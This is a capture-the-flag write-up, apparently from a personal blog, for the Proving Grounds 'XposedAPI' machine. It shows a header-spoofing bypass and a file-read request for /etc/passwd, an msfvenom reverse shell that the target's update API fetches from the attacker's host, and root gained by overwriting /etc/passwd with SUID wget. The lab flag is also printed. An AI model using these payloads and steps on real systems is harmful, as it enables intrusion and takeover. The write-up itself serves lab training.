---
title: "XposedAPI - PG"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2022-01-16 07:07:10 +05:30
categories: [Writeups, Proving Grounds]
tags: [PG, API, SUID, wget]
render_with_liquid: false
---

## Recon & Enumeration

```bash
# autorecon
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.134
```

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
13337/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Remote Software Management API
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn/20.0.4
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%)
```

---

## Exploitation

- http://192.168.123.134:13337/logs 
- WAF: Access Denied for this Host.
- Google: WAF Access Denied for this Host bypass 
- https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c 
- `X-Forwarded-For:127.0.0.1` header 

```
GET /logs?file=/etc/passwd HTTP/1.1
Host: 192.168.123.134:13337
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<--SNIP-->
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

- We get the username: `clumsyadmin`
- Now our POST request works and we get a shell as user `clumsyadmin` once we restart the app by visiting `/restart`

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.123 LPORT=22 -f elf -o shell
python3 -m http.server 80
nc -lvnp 22
```

```
POST /update HTTP/1.1
Host: 192.168.123.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
DNT: 1
Sec-GPC: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 60

{"user":"clumsyadmin", "url":"http://192.168.49.123/shell"} 
```

---

## Privilege Escalation 

- `find / -perm -4000 2>/dev/null`
- Privilege Escalation with wget SUID 
- `wget` has SUID bit set so we can use that to edit and replace `/etc/passwd` file with password for `root` user 
- Download the `/etc/passwd` file from the target and add some password hash for root user 
- `openssl passwd pass123 => Xh/bM.jezOXCo`
- `wget 192.168.49.123/passwd -O /etc/passwd`
- `su root => pass123`
- `whoami => root`

```
root@xposedapi:~# 
whoami && hostname && id && ifconfig | grep inet && cat proof.txt
root
xposedapi
uid=0(root) gid=0(root) groups=0(root)
        inet 192.168.123.134  netmask 255.255.255.0  broadcast 192.168.123.255
        inet 127.0.0.1  netmask 255.0.0.0
a82b28951444346478fab645553f55
```

